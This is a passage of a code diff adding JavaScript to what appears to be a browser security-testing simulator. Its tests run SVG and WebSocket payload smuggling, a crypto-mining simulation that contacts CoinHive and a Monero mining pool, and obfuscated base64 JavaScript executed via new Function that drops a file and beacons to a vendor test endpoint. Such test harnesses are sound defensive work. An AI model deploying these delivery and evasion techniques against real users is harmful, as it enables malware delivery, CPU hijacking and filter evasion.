+            trigger.addEventListener('click', (e) => {
+                e.preventDefault(); 
+                setBadgeStatus('badge-quish', 'status-fired', 'Payload Executed ⚠️');
+                window.open('http://urlfiltering.paloaltonetworks.com/test-phishing', '_blank');
+            });
+        });
+
+        // --- TEST 5: ADVANCED SVG SMUGGLING ---
+        document.getElementById('startSvgTestBtn').addEventListener('click', async () => {
+            const btnId = 'startSvgTestBtn';
+            toggleBtnState(btnId, true);
+            updateLog('log5', '', true);
+            setBadgeStatus('badge-svg', 'status-fired', 'Payload Sent ⚠️');
+            
+            updateLog('log5', 'Creating invisible SVG element in DOM...');
+            const svg = document.createElementNS('http://www.w3.org/2000/svg', 'svg');
+            svg.style.display = 'none';
+            svg.id = 'malicious-svg-carrier';
+            
+            updateLog('log5', 'Embedding Base64 payload into SVG dataset attribute...');
+            svg.setAttribute('data-malware-payload', GLOBAL_PAYLOAD_B64);
+            document.body.appendChild(svg);
+            
+            await new Promise(r => setTimeout(r, 1000)); 
+            
+            updateLog('log5', 'Extracting payload from DOM element...');
+            const extractedB64 = document.getElementById('malicious-svg-carrier').getAttribute('data-malware-payload');
+            
+            updateLog('log5', 'Reassembling and triggering download...');
+            const binStr = atob(extractedB64);
+            const bytes = new Uint8Array(binStr.length);
+            for (let i = 0; i < binStr.length; i++) bytes[i] = binStr.charCodeAt(i);
+            
+            triggerDownload(bytes, `svg_smuggled_${GLOBAL_FILENAME}`);
+            
+            document.body.removeChild(svg);
+            toggleBtnState(btnId, false, "Run SVG Smuggling");
+        });
+
+        // --- TEST 6: CRYPTO-JACKING (BEHAVIORAL & NETWORK SIGNATURES) ---
+        document.getElementById('startCryptoTestBtn').addEventListener('click', async () => {
+            const btnId = 'startCryptoTestBtn';
+            toggleBtnState(btnId, true);
+            updateLog('log6', '', true);
+            setBadgeStatus('badge-crypto', 'status-fired', 'Executing ⚠️');
+            
+            document.getElementById('mining-bar').style.display = 'block';
+            const progress = document.getElementById('mining-progress');
+            progress.style.width = '0%';
+            
+            updateLog('log6', 'Simulating CoinHive script injection...');
+            fetch('https://api.coinhive.com/lib/coinhive.min.js', { mode: 'no-cors' }).catch(e => {});
+            
+            updateLog('log6', 'Spawning 8 Web Workers to hijack CPU...');
+            updateLog('log6', 'Initiating Stratum protocol WebSockets to mining pool...');
+            
+            const minerCode = `
+                onmessage = function(e) {
+                    const duration = e.data;
+                    const start = Date.now();
+                    let hashes = 0;
+                    try {
+                        const ws = new WebSocket('wss://xmr.pool.minergate.com:45560');
+                        ws.onopen = () => {
+                            ws.send(JSON.stringify({ "method": "login", "params": { "login": "test_miner", "pass": "x" } }));
+                        };
+                    } catch(err) {}
+
+                    while (Date.now() - start < duration) {
+                        let temp = 0;
+                        for (let i = 0; i < 1000; i++) { temp += Math.sin(i) * Math.cos(i) * Math.tan(i); }
+                        hashes += 1000;
+                    }
+                    postMessage(hashes);
+                }
+            `;
+
+            const numWorkers = 8;
+            const durationMs = 5000; 
+            const workers = [];
+            const promises = [];
+
+            for(let i=0; i<numWorkers; i++) {
+                const blob = new Blob([minerCode], { type: 'application/javascript' });
+                const worker = new Worker(URL.createObjectURL(blob));
+                workers.push(worker);
+                promises.push(new Promise(resolve => {
+                    worker.onmessage = (e) => resolve(e.data);
+                }));
+                worker.postMessage(durationMs);
+            }
+
+            let width = 0;
+            const interval = setInterval(() => {
+                width += 2; 
+                progress.style.width = width + '%';
+            }, 100);
+
+            try {
+                const results = await Promise.all(promises);
+                clearInterval(interval);
+                progress.style.width = '100%';
+                
+                const totalHashes = results.reduce((a, b) => a + b, 0);
+                updateLog('log6', `Mining complete. Calculated ${(totalHashes / 1000000).toFixed(2)} Million hashes across 8 cores.`);
+                updateLog('log6', `Attempted outbound connection to wss://xmr.pool.minergate.com.`);
+                setBadgeStatus('badge-crypto', 'status-fired', 'Payload Executed ⚠️');
+            } catch (e) {
+                clearInterval(interval);
+                updateLog('log6', 'Miner interrupted or failed.');
+            }
+
+            workers.forEach(w => w.terminate());
+            setTimeout(() => {
+                document.getElementById('mining-bar').style.display = 'none';
+                progress.style.width = '0%';
+                toggleBtnState(btnId, false, "Launch Simulated CPU Miner");
+            }, 2500); 
+        });
+
+        // --- TEST 7: WEB SOCKET MALWARE ---
+        document.getElementById('startWsTestBtn').addEventListener('click', async () => {
+            const btnId = 'startWsTestBtn';
+            toggleBtnState(btnId, true);
+            updateLog('log7', '', true);
+            setBadgeStatus('badge-ws', 'status-fired', 'Payload Sent ⚠️');
+
+            updateLog('log7', 'Initiating HTTP request... upgrading via 101 Switching Protocols...');
+            const wsUrl = 'wss://ws.postman-echo.com/raw';
+            updateLog('log7', `Connecting encrypted tunnel to ${wsUrl}...`);
+
+            try {
+                const ws = new WebSocket(wsUrl);
+
+                ws.onopen = () => {
+                    updateLog('log7', 'WebSocket connection established (WSS/TLS).');
+                    updateLog('log7', 'Requesting malicious payload through encrypted tunnel...');
+                    ws.send(GLOBAL_PAYLOAD_B64);
+                };
+
+                ws.onmessage = (event) => {
+                    updateLog('log7', 'Received encrypted payload stream via WebSocket.');
+                    updateLog('log7', 'Decoding and reassembling locally...');
+
+                    const binStr = atob(event.data);
+                    const bytes = new Uint8Array(binStr.length);
+                    for (let i = 0; i < binStr.length; i++) bytes[i] = binStr.charCodeAt(i);
+
+                    triggerDownload(bytes, `ws_malware_${GLOBAL_FILENAME}`);
+                    ws.close();
+                    toggleBtnState(btnId, false, "Run WebSocket Malware");
+                };
+
+                ws.onerror = (error) => {
+                    updateLog('log7', 'WebSocket connection failed. Using local stream simulation...');
+                    setTimeout(() => {
+                        updateLog('log7', 'Fallback: Received encrypted payload stream via simulated socket.');
+                        const binStr = atob(GLOBAL_PAYLOAD_B64);
+                        const bytes = new Uint8Array(binStr.length);
+                        for (let i = 0; i < binStr.length; i++) bytes[i] = binStr.charCodeAt(i);
+                        triggerDownload(bytes, `ws_malware_${GLOBAL_FILENAME}`);
+                        toggleBtnState(btnId, false, "Run WebSocket Malware");
+                    }, 1000);
+                };
+            } catch(e) {
+                 updateLog('log7', 'Error: ' + e.message);
+                 toggleBtnState(btnId, false, "Run WebSocket Malware");
+            }
+        });
+
+        // --- TEST 8: MALICIOUS OBFUSCATION (OBFUSCATED JS) ---
+        var MoV0EGAe = function(s) {
+            return atob(s);
+        };
+
+        document.getElementById('startObfuscationTestBtn').addEventListener('click', async () => {
+            const btnId = 'startObfuscationTestBtn';
+            toggleBtnState(btnId, true);
+            updateLog('log8', '', true);
+
+            updateLog('log8', 'Generating heavily obfuscated hex/unicode payload fragments...');
+
+            // 1. Define the malicious script payload we want to hide (Drop PE, Beacon, and Popup)
+            // It explicitly passes 'badge-obfuscation' to the popup so the correct dashboard tile gets updated
+            const targetJS = `const payloadB64='${GLOBAL_PAYLOAD_B64}';const binaryString=atob(payloadB64);const bytes=new Uint8Array(binaryString.length);for(let i=0;i<binaryString.length;i++){bytes[i]=binaryString.charCodeAt(i);}const blob=new Blob([bytes],{type:'application/octet-stream'});const url=URL.createObjectURL(blob);const a=document.createElement('a');a.href=url;a.download='obfuscated_js_${GLOBAL_FILENAME}';document.body.appendChild(a);a.click();setTimeout(()=>{document.body.removeChild(a);URL.revokeObjectURL(url);},100);fetch('https://wildfire.paloaltonetworks.com/publicapi/test/pe',{method:'POST',mode:'no-cors',headers:{'Content-Type':'application/json'},body:JSON.stringify({status:'payload_executed'})}).catch(e=>console.log('C2 beacon fired.'));window.triggerEvasionPopup('badge-obfuscation');`;
+            
+            // 2. Base64 encode the executable JavaScript (This is what the attacker obfuscates)
+            const b64JS = btoa(targetJS);
+
+            // 3. Break the encoded JS into chunks
+            let chunks = [];
+            let i = 0;
+            while (i < b64JS.length) {
+                let size = Math.floor(Math.random() * 15) + 5;
+                chunks.push(b64JS.substring(i, i + size));
+                i += size;
+            }
+
+            updateLog('log8', `Divided execution payload into ${chunks.length} separate variables using hex escaping...`);
+
+            // Simulate the concatenation and DOM injection
+            setTimeout(() => {
+                updateLog('log8', 'Concatenating fragments into massive iouK_nAn string variable...');
+                updateLog('log8', 'Executing document.write(MoV0EGAe(iouK_nAn)) sequence...');
+
+                try {
+                    // Simulate the string concatenation
+                    const iouK_nAn = chunks.join('');
+                    
+                    // We bypass actual document.write to keep the simulator UI intact, 
+                    // but we execute the decoded JS payload identically to the real attack.
+                    const decodedScript = MoV0EGAe(iouK_nAn);
+                    const runner = new Function(decodedScript);
+                    
+                    // The runner executes the payload drop and the popup
+                    runner();
+                    
+                    updateLog('log8', 'Execution complete. Popup triggered and payload dropped.');
+                } catch (e) {
+                    updateLog('log8', 'Execution error: ' + e.message);
+                }
+                toggleBtnState(btnId, false, "Run Obfuscated JS");
+            }, 1000);
+        });
+
+    </script>
+</body>
+</html>
